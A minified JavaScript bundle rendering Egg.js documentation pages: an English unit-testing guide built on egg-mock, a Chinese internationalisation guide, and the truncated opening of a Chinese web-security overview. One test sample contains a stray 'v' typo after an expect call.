test:"),r.a.createElement(o["a"],{code:"// using Promise\nit('should redirect', () => {\n  return app.httpRequest().get('/').expect(302);\n});\n\n// using callback\nit('should redirect', (done) => {\n  app.httpRequest().get('/').expect(302, done);\n});\n\n// using async\nit('should redirect', async () => {\n  await app.httpRequest().get('/').expect(302);\n});",lang:"js"}),r.a.createElement("p",null,"According to specific situation, you could make different choice of these ways. Multiple asynchronous test cases could be composed to one test with async function, or divided into several independent tests."),r.a.createElement("h2",{id:"controller-test"},r.a.createElement(l["AnchorLink"],{to:"#controller-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller Test"),r.a.createElement("p",null,"It's the tough part of all application tests, since it's closely related to router configuration. We need use ",r.a.createElement("code",null,"app.httpRequest()")," to return a real instance ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest"),", which connects Router and Controller and could also help us to examine param verification of Router by loading boundary conditions. ",r.a.createElement("code",null,"app.httpRequest()")," is a request instance ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest")," which is encapsulated by ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock"),"."),r.a.createElement("p",null,"Here is an ",r.a.createElement("code",null,"app/controller/home.js")," example."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('homepage', '/', controller.home.index);\n};\n\n// app/controller/home.js\nclass HomeController extends Controller {\n  async index() {\n    this.ctx.body = 'hello world';\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Then a test."),r.a.createElement(o["a"],{code:"// test/controller/home.test.js\nconst { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/controller/home.test.js', () => {\n  describe('GET /', () => {\n    it('should status 200 and get the body', () => {\n      // load `GET /` request\n      return app.httpRequest()\n        .get('/')\n        .expect(200) // set expectation of status to 200\n        .expect('hello world'); // set expectation of body to 'hello world'\n    });\n\n    it('should send multi requests', async () => {\n      await app.httpRequest()\n        .get('/')\n        .expect(200) v\n        .expect('hello world'); // set expectation of body to 'hello world'\n\n      // once more\n      const result = await app.httpRequest()\n        .get('/')\n        .expect(200)\n        .expect('hello world');\n\n      // verify via assert\n      assert(result.status === 200);\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"app.httpRequest")," based on SuperTest supports a majority of HTTP methods such as GET, POST, PUT, and it provides rich interfaces to construct request, such as a JSON POST request."),r.a.createElement(o["a"],{code:"// app/controller/home.js\nclass HomeController extends Controller {\n  async post() {\n    this.ctx.body = this.ctx.request.body;\n  }\n}\n\n// test/controller/home.test.js\nit('should status 200 and get the request body', () => {\n  // mock CSRF token\uff0cexplain later\n  app.mockCsrf();\n  return app\n    .httpRequest()\n    .post('/post')\n    .type('form')\n    .send({\n      foo: 'bar',\n    })\n    .expect(200)\n    .expect({\n      foo: 'bar',\n    });\n});",lang:"js"}),r.a.createElement("p",null,"See details at ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest#getting-started"},"SuperTest Document"),"\u3002"),r.a.createElement("h3",{id:"mock-csrf"},r.a.createElement(l["AnchorLink"],{to:"#mock-csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"mock CSRF"),r.a.createElement("p",null,"The security plugin of framework would enable ",r.a.createElement(l["AnchorLink"],{to:"./security#csrf-prevention"},"CSRF prevention")," as default. Typically, tests have to precede with a request of page in order to parse CSRF token from the response, and then use the token in later POST requests. But egg-mock provides the ",r.a.createElement("code",null,"app.mockCsrf()")," function to skip the verification of the CSRF token of requests sent by SuperTest."),r.a.createElement(o["a"],{code:"app.mockCsrf();\nreturn app\n  .httpRequest()\n  .post('/post')\n  .type('form')\n  .send({\n    foo: 'bar',\n  })\n  .expect(200)\n  .expect({\n    foo: 'bar',\n  });",lang:"js"}),r.a.createElement("h2",{id:"service-test"},r.a.createElement(l["AnchorLink"],{to:"#service-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service Test"),r.a.createElement("p",null,"Service is easier to test than Controller. We need to create a ctx, and then get the instance of Service via ",r.a.createElement("code",null,"ctx.service.$","{","serviceName","}"),", and then use the instance to test."),r.a.createElement("p",null,"For example:"),r.a.createElement(o["a"],{code:"// app/service/user.js\nclass UserService extends Service {\n  async get(name) {\n    return await userDatabase.get(name);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"And a test:"),r.a.createElement(o["a"],{code:"describe('get()', () => {\n  // using generator function because of asynchronous invoking\n  it('should get exists user', async () => {\n    // create ctx\n    const ctx = app.mockContext();\n    // get service.user via ctx\n    const user = await ctx.service.user.get('fengmk2');\n    assert(user);\n    assert(user.name === 'fengmk2');\n  });\n\n  it('should get null when user not exists', async () => {\n    const ctx = app.mockContext();\n    const user = await ctx.service.user.get('fengmk1');\n    assert(!user);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Of course it's just a sample, actual code would probably be more complicated."),r.a.createElement("h2",{id:"extend-test"},r.a.createElement(l["AnchorLink"],{to:"#extend-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Test"),r.a.createElement("p",null,"It's extendable of Application, Request, Response and Context as well as Helper, and we are able to write specific test cases for extended functions or properties."),r.a.createElement("h3",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,"When an app instance is created by egg-mock, the extended functions and properties are already available on the instance and can be tested directly."),r.a.createElement("p",null,"For example, we extend the application in ",r.a.createElement("code",null,"app/extend/application")," to support cache based on ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/ylru"},"ylru"),"."),r.a.createElement(o["a"],{code:"const LRU = Symbol('Application#lru');\nconst LRUCache = require('ylru');\nmodule.exports = {\n  get lru() {\n    if (!this[LRU]) {\n      this[LRU] = new LRUCache(1000);\n    }\n    return this[LRU];\n  },\n};",lang:"js"}),r.a.createElement("p",null,"A corresponding test:"),r.a.createElement(o["a"],{code:"describe('get lru', () => {\n  it('should get a lru and it work', () => {\n    // set cache\n    app.lru.set('foo', 'bar');\n    // get cache\n    assert(app.lru.get('foo') === 'bar');\n  });\n});",lang:"js"}),r.a.createElement("p",null,"As you can see, it's easy."),r.a.createElement("h3",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Compared to Application, you need only one more step for Context tests, which is to create an Context instance via ",r.a.createElement("code",null,"app.mockContext"),"."),r.a.createElement("p",null,"Such as adding a property named ",r.a.createElement("code",null,"isXHR")," to ",r.a.createElement("code",null,"app/extend/context.js")," to present whether or not the request was submitted via ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader"},"XMLHttpRequest"),"."),r.a.createElement(o["a"],{code:"module.exports = {\n  get isXHR() {\n    return this.get('X-Requested-With') === 'XMLHttpRequest';\n  },\n};",lang:"js"}),r.a.createElement("p",null,"A corresponding test:"),r.a.createElement(o["a"],{code:"describe('isXHR()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'X-Requested-With': 'XMLHttpRequest',\n      },\n    });\n    assert(ctx.isXHR === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'X-Requested-With': 'SuperAgent',\n      },\n    });\n    assert(ctx.isXHR === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"request"},r.a.createElement(l["AnchorLink"],{to:"#request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request"),r.a.createElement("p",null,"Extended properties and function are available on ",r.a.createElement("code",null,"ctx.request"),", so they can be tested directly."),r.a.createElement("p",null,"For example, provide a ",r.a.createElement("code",null,"isChrome")," property to ",r.a.createElement("code",null,"app/extend/request.js")," to verify requests whether they are from Chrome or not."),r.a.createElement(o["a"],{code:"const IS_CHROME = Symbol('Request#isChrome');\nmodule.exports = {\n  get isChrome() {\n    if (!this[IS_CHROME]) {\n      const ua = this.get('User-Agent').toLowerCase();\n      this[IS_CHROME] = ua.includes('chrome/');\n    }\n    return this[IS_CHROME];\n  },\n};",lang:"js"}),r.a.createElement("p",null,"A corresponding test:"),r.a.createElement(o["a"],{code:"describe('isChrome()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'User-Agent': 'Chrome/56.0.2924.51',\n      },\n    });\n    assert(ctx.request.isChrome === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext({\n      headers: {\n        'User-Agent': 'FireFox/1',\n      },\n    });\n    assert(ctx.request.isChrome === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"response"},r.a.createElement(l["AnchorLink"],{to:"#response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Response"),r.a.createElement("p",null,"Identical with Request, Response test could be based on ",r.a.createElement("code",null,"ctx.response")," directly, accessing all the extended functions and properties."),r.a.createElement("p",null,"For example, provide an ",r.a.createElement("code",null,"isSuccess")," property to indicate current status code equal to 200 or not."),r.a.createElement(o["a"],{code:"module.exports = {\n  get isSuccess() {\n    return this.status === 200;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"The corresponding test:"),r.a.createElement(o["a"],{code:"describe('isSuccess()', () => {\n  it('should true', () => {\n    const ctx = app.mockContext();\n    ctx.status = 200;\n    assert(ctx.response.isSuccess === true);\n  });\n\n  it('should false', () => {\n    const ctx = app.mockContext();\n    ctx.status = 404;\n    assert(ctx.response.isSuccess === false);\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Similar to Service, Helper is available on ctx, which can be tested directly."),r.a.createElement("p",null,"Such as ",r.a.createElement("code",null,"app/extend/helper.js"),":"),r.a.createElement(o["a"],{code:"module.exports = {\n  money(val) {\n    const lang = this.ctx.get('Accept-Language');\n    if (lang.includes('zh-CN')) {\n      return `\uffe5 ${val}`;\n    }\n    return `$ ${val}`;\n  },\n};",lang:"js"}),r.a.createElement("p",null,"A corresponding test:"),r.a.createElement(o["a"],{code:"describe('money()', () => {\n  it('should RMB', () => {\n    const ctx = app.mockContext({\n      // mock headers of ctx\n      headers: {\n        'Accept-Language': 'zh-CN,zh;q=0.5',\n      },\n    });\n    assert(ctx.helper.money(100) === '\uffe5 100');\n  });\n\n  it('should US Dolar', () => {\n    const ctx = app.mockContext();\n    assert(ctx.helper.money(100) === '$ 100');\n  });\n});",lang:"js"}),r.a.createElement("h2",{id:"mock-function"},r.a.createElement(l["AnchorLink"],{to:"#mock-function","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Function"),r.a.createElement("p",null,"Except functions mentioned above, like ",r.a.createElement("code",null,"app.mockContext()")," and ",r.a.createElement("code",null,"app.mockCsrf()"),", egg-mock provides ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#api"},"quite a few mocking functions")," to make writing tests easier."),r.a.createElement("ul",null,r.a.createElement("li",null,"To prevent console logs through ",r.a.createElement("code",null,"mock.consoleLevel('NONE')")),r.a.createElement("li",null,"To mock session data through ",r.a.createElement("code",null,"app.mockSession(data)"))),r.a.createElement(o["a"],{code:"describe('GET /session', () => {\n  it('should mock session work', () => {\n    app.mockSession({\n      foo: 'bar',\n      uid: 123,\n    });\n    return app\n      .httpRequest()\n      .get('/session')\n      .expect(200)\n      .expect({\n        session: {\n          foo: 'bar',\n          uid: 123,\n        },\n      });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Remember to restore mock data in an ",r.a.createElement("code",null,"afterEach")," hook, otherwise it would take effect with all the tests that supposed to be independent to each other."),r.a.createElement(o["a"],{code:"describe('some test', () => {\n  // before hook\n\n  afterEach(mock.restore);\n\n  // it tests\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"When you use ",r.a.createElement("code",null,"egg-mock/bootstrap"),", resetting work would be done automatically in an ",r.a.createElement("code",null,"afterEach")," hook, Do not need to write these code any more.")),r.a.createElement("p",null,"The following will describe the common usage of egg-mock."),r.a.createElement("h3",{id:"mock-properties-and-functions"},r.a.createElement(l["AnchorLink"],{to:"#mock-properties-and-functions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Properties And Functions"),r.a.createElement("p",null,"Egg-mock is extended from ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/mm"},"mm")," module which contains full features of mm, so we can directly mock any objects' properties and functions."),r.a.createElement("h4",{id:"mock-properties"},r.a.createElement(l["AnchorLink"],{to:"#mock-properties","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Properties"),r.a.createElement("p",null,"Mock ",r.a.createElement("code",null,"app.config.baseDir")," to return a given value - ",r.a.createElement("code",null,"/tmp/mockapp"),"."),r.a.createElement(o["a"],{code:"mock(app.config, 'baseDir', '/tmp/mockapp');\nassert(app.config.baseDir === '/tmp/mockapp');",lang:"js"}),r.a.createElement("h4",{id:"mock-functions"},r.a.createElement(l["AnchorLink"],{to:"#mock-functions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Functions"),r.a.createElement("p",null,"Mock ",r.a.createElement("code",null,"fs.readFileSync")," to return a given function."),r.a.createElement(o["a"],{code:"mock(fs, 'readFileSync', (filename) => {\n  return 'hello world';\n});\nassert(fs.readFileSync('foo.txt') === 'hello world');",lang:"js"}),r.a.createElement("p",null,"See more detail in ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/mm#api"},"mm API"),", include advanced usage like ",r.a.createElement("code",null,"mock.data()"),"\uff0c",r.a.createElement("code",null,"mock.error()")," and so on."),r.a.createElement("h3",{id:"mock-service"},r.a.createElement(l["AnchorLink"],{to:"#mock-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock Service"),r.a.createElement("p",null,"Service is a standard built-in member of the framework, ",r.a.createElement("code",null,"app.mockService(service, methodName, fn)")," is offered to conveniently mock its result."),r.a.createElement("p",null,"For example, mock the method ",r.a.createElement("code",null,"get(name)")," in ",r.a.createElement("code",null,"app/service/user")," to return a nonexistent user."),r.a.createElement(o["a"],{code:"it('should mock fengmk1 exists', () => {\n  app.mockService('user', 'get', () => {\n    return {\n      name: 'fengmk1',\n    };\n  });\n\n  return (\n    app\n      .httpRequest()\n      .get('/user?name=fengmk1')\n      .expect(200)\n      // return an originally nonexistent user\n      .expect({\n        name: 'fengmk1',\n      })\n  );\n});",lang:"js"}),r.a.createElement("p",null,"Using ",r.a.createElement("code",null,"app.mockServiceError(service, methodName, error)")," to mock exception."),r.a.createElement("p",null,"For example, mock the method ",r.a.createElement("code",null,"get(name)")," in ",r.a.createElement("code",null,"app/service/user")," to throw an exception."),r.a.createElement(o["a"],{code:"it('should mock service error', () => {\n  app.mockServiceError('user', 'get', 'mock user service error');\n  return (\n    app\n      .httpRequest()\n      .get('/user?name=fengmk2')\n      // service exception causing the 500 status code\n      .expect(500)\n      .expect(/mock user service error/)\n  );\n});",lang:"js"}),r.a.createElement("h3",{id:"mock-httpclient"},r.a.createElement(l["AnchorLink"],{to:"#mock-httpclient","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mock HttpClient"),r.a.createElement("p",null,"External HTTP requests should be performed though ",r.a.createElement(l["Link"],{to:"./httpclient"},"HttpClient"),", a built-in member of Egg, and ",r.a.createElement("code",null,"app.mockHttpclient(url, method, data)")," is able to simulate various network exceptions of requests performed by ",r.a.createElement("code",null,"app.curl")," and ",r.a.createElement("code",null,"ctx.curl"),"."),r.a.createElement("p",null,"For example, we submit a request in ",r.a.createElement("code",null,"app/controller/home.js"),"."),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async httpclient() {\n    const res = await this.ctx.curl('https://eggjs.org');\n    this.ctx.body = res.data.toString();\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Then mock it's response."),r.a.createElement(o["a"],{code:"describe('GET /httpclient', () => {\n  it('should mock httpclient response', () => {\n    app.mockHttpclient('https://eggjs.org', {\n      // parameter allowed to be a buffer / string / json,\n      // will be finally converted to buffer\n      // according to options.dataType\n      data: 'mock eggjs.org response',\n    });\n    return app\n      .httpRequest()\n      .get('/httpclient')\n      .expect('mock eggjs.org response');\n  });\n});",lang:"js"}),r.a.createElement("h2",{id:"sample-code"},r.a.createElement(l["AnchorLink"],{to:"#sample-code","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Sample Code"),r.a.createElement("p",null,"All sample code can be found in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/blob/master/unittest"},"eggjs/exmaples/unittest"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},nPoA:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\u591a\u8bed\u8a00\u5e94\u7528\uff0c\u6846\u67b6\u5185\u7f6e\u4e86\u56fd\u9645\u5316\uff08I18n\uff09\u652f\u6301\uff0c\u7531 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-i18n"},"egg-i18n")," \u63d2\u4ef6\u63d0\u4f9b\u3002"),r.a.createElement("h2",{id:"\u9ed8\u8ba4\u8bed\u8a00"},r.a.createElement(l["AnchorLink"],{to:"#\u9ed8\u8ba4\u8bed\u8a00","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9ed8\u8ba4\u8bed\u8a00"),r.a.createElement("p",null,"\u9ed8\u8ba4\u8bed\u8a00\u662f ",r.a.createElement("code",null,"en-US"),"\u3002\u5047\u8bbe\u6211\u4eec\u60f3\u4fee\u6539\u9ed8\u8ba4\u8bed\u8a00\u4e3a\u7b80\u4f53\u4e2d\u6587\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.i18n = {\n  defaultLocale: 'zh-CN',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u5207\u6362\u8bed\u8a00"},r.a.createElement(l["AnchorLink"],{to:"#\u5207\u6362\u8bed\u8a00","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5207\u6362\u8bed\u8a00"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u51e0\u79cd\u65b9\u5f0f\u4fee\u6539\u5e94\u7528\u7684\u5f53\u524d\u8bed\u8a00\uff08\u4fee\u6539\u540e\u4f1a\u8bb0\u5f55\u5230 ",r.a.createElement("code",null,"locale")," \u8fd9\u4e2a Cookie\uff09\uff0c\u4e0b\u6b21\u8bf7\u6c42\u76f4\u63a5\u7528\u8bbe\u5b9a\u597d\u7684\u8bed\u8a00\u3002"),r.a.createElement("p",null,"\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"query: ",r.a.createElement("code",null,"/?locale=en-US")),r.a.createElement("li",null,"cookie: ",r.a.createElement("code",null,"locale=zh-TW")),r.a.createElement("li",null,"header: ",r.a.createElement("code",null,"Accept-Language: zh-CN,zh;q=0.5"))),r.a.createElement("p",null,"\u5982\u679c\u60f3\u4fee\u6539 query \u6216\u8005 Cookie \u53c2\u6570\u540d\u79f0\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.i18n = {\n  queryField: 'locale',\n  cookieField: 'locale',\n  // Cookie \u9ed8\u8ba4\u4e00\u5e74\u540e\u8fc7\u671f\uff0c \u5982\u679c\u8bbe\u7f6e\u4e3a Number\uff0c\u5219\u5355\u4f4d\u4e3a ms\n  cookieMaxAge: '1y',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u7f16\u5199-i18n-\u591a\u8bed\u8a00\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199-i18n-\u591a\u8bed\u8a00\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199 I18n \u591a\u8bed\u8a00\u6587\u4ef6"),r.a.createElement("p",null,"\u591a\u79cd\u8bed\u8a00\u7684\u914d\u7f6e\u662f\u72ec\u7acb\u7684\uff0c\u7edf\u4e00\u5b58\u653e\u5728 ",r.a.createElement("code",null,"config/locale/*.js")," \u4e0b\u3002"),r.a.createElement(o["a"],{code:"- config/locale/\n  - en-US.js\n  - zh-CN.js\n  - zh-TW.js",lang:"unknown"}),r.a.createElement("p",null,"\u4e0d\u4ec5\u5bf9\u4e8e\u5e94\u7528\u76ee\u5f55\u751f\u6548\uff0c\u5728\u6846\u67b6\uff0c\u63d2\u4ef6\u7684 ",r.a.createElement("code",null,"config/locale")," \u76ee\u5f55\u4e0b\u540c\u6837\u751f\u6548\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\u5355\u8bcd\u62fc\u5199\uff0c\u662f locale \u4e0d\u662f locals\u3002")),r.a.createElement("p",null,"\u4f8b\u5982\uff1a"),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  Email: '\u90ae\u7bb1',\n};",lang:"js"}),r.a.createElement("p",null,"\u6216\u8005\u4e5f\u53ef\u4ee5\u7528 JSON \u683c\u5f0f\u7684\u6587\u4ef6\uff1a"),r.a.createElement(o["a"],{code:'// config/locale/zh-CN.json\n{\n  "Email": "\u90ae\u7bb1"\n}',lang:"json"}),r.a.createElement("h2",{id:"\u83b7\u53d6\u591a\u8bed\u8a00\u6587\u672c"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u591a\u8bed\u8a00\u6587\u672c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u591a\u8bed\u8a00\u6587\u672c"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement("code",null,"__")," (Alias: ",r.a.createElement("code",null,"gettext"),") \u51fd\u6570\u83b7\u53d6 locale \u6587\u4ef6\u5939\u4e0b\u9762\u7684\u591a\u8bed\u8a00\u6587\u672c\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f: ",r.a.createElement("code",null,"__")," \u662f\u4e24\u4e2a\u4e0b\u5212\u7ebf")),r.a.createElement("p",null,"\u4ee5\u4e0a\u9762\u914d\u7f6e\u8fc7\u7684\u591a\u8bed\u8a00\u4e3a\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"ctx.__('Email');\n// zh-CN => \u90ae\u7bb1\n// en-US => Email",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u6587\u672c\u4e2d\u542b\u6709 ",r.a.createElement("code",null,"%s"),"\uff0c",r.a.createElement("code",null,"%j")," \u7b49 format \u51fd\u6570\uff0c\u53ef\u4ee5\u6309\u7167 ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/util.html#util_util_format_format_args"},r.a.createElement("code",null,"util.format()"))," \u7c7b\u4f3c\u7684\u65b9\u5f0f\u8c03\u7528\uff1a"),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  'Welcome back, %s!': '\u6b22\u8fce\u56de\u6765\uff0c%s!',\n};\n\nctx.__('Welcome back, %s!', 'Shawn');\n// zh-CN => \u6b22\u8fce\u56de\u6765\uff0cShawn!\n// en-US => Welcome back, Shawn!",lang:"js"}),r.a.createElement("p",null,"\u540c\u65f6\u652f\u6301\u6570\u7ec4\u4e0b\u6807\u5360\u4f4d\u7b26\u65b9\u5f0f\uff0c\u4f8b\u5982\uff1a"),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  'Hello {0}! My name is {1}.': '\u4f60\u597d {0}! \u6211\u7684\u540d\u5b57\u53eb {1}\u3002',\n};\n\nctx.__('Hello {0}! My name is {1}.', ['foo', 'bar']);\n// zh-CN => \u4f60\u597d foo\uff01\u6211\u7684\u540d\u5b57\u53eb bar\u3002\n// en-US => Hello foo! My name is bar.",lang:"js"}),r.a.createElement("h3",{id:"controller-\u4e2d\u4f7f\u7528"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u4e2d\u4f7f\u7528","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller \u4e2d\u4f7f\u7528"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    ctx.body = {\n      message: ctx.__('Welcome back, %s!', ctx.user.name)\n      // \u6216\u8005\u4f7f\u7528 gettext\uff0cgettext \u662f __ \u51fd\u6570\u7684 alias\n      // message: ctx.gettext('Welcome back', ctx.user.name)\n      user: ctx.user,\n    };\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"view-\u4e2d\u4f7f\u7528"},r.a.createElement(l["AnchorLink"],{to:"#view-\u4e2d\u4f7f\u7528","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"View \u4e2d\u4f7f\u7528"),r.a.createElement("p",null,"\u5047\u8bbe\u6211\u4eec\u4f7f\u7528\u7684\u6a21\u677f\u5f15\u64ce\u662f ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"Nunjucks")),r.a.createElement(o["a"],{code:"<li>{{ __('Email') }}: {{ user.email }}</li>\n<li>{{ __('Welcome back, %s!', user.name) }}</li>\n<li>{{ __('Hello {0}! My name is {1}.', ['foo', 'bar']) }}</li>",lang:"html"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},nTVa:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"web-\u5b89\u5168\u6982\u5ff5"},r.a.createElement(l["AnchorLink"],{to:"#web-\u5b89\u5168\u6982\u5ff5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Web \u5b89\u5168\u6982\u5ff5"),r.a.createElement("p",null,"Web \u5e94\u7528\u4e2d\u5b58\u5728\u5f88\u591a\u5b89\u5168\u98ce\u9669\uff0c\u8fd9\u4e9b\u98ce\u9669\u4f1a\u88ab\u9ed1\u5ba2\u5229\u7528\uff0c\u8f7b\u5219\u7be1\u6539\u7f51\u9875\u5185\u5bb9\uff0c\u91cd\u5219\u7a83\u53d6\u7f51\u7ad9\u5185\u90e8\u6570\u636e\uff0c\u66f4\u4e3a\u4e25\u91cd\u7684\u5219\u662f\u5728\u7f51\u9875\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4f7f\u5f97\u7528\u6237\u53d7\u5230\u4fb5\u5bb3\u3002\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\u5982\u4e0b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"XSS \u653b\u51fb\uff1a\u5bf9 Web \u9875\u9762\u6ce8\u5165\u811a\u672c\uff0c\u4f7f\u7528 JavaScript \u7a83\u53d6\u7528\u6237\u4fe1\u606f\uff0c\u8bf1\u5bfc\u7528\u6237\u64cd\u4f5c\u3002"),r.a.createElement("li",null,"CSRF \u653b\u51fb\uff1a\u4f2a\u9020\u7528\u6237\u8bf7\u6c42\u5411\u7f51\u7ad9\u53d1\u8d77\u6076\u610f\u8bf7\u6c42\u3002"),r.a.createElement("li",null,"\u9493\u9c7c\u653b\u51fb\uff1a\u5229\u7528\u7f51\u7ad9\u7684\u8df3\u8f6c\u94fe\u63a5\u6216\u8005\u56fe\u7247\u5236\u9020\u9493\u9c7c\u9677\u9631\u3002"),r.a.createElement("li",null,"HTTP 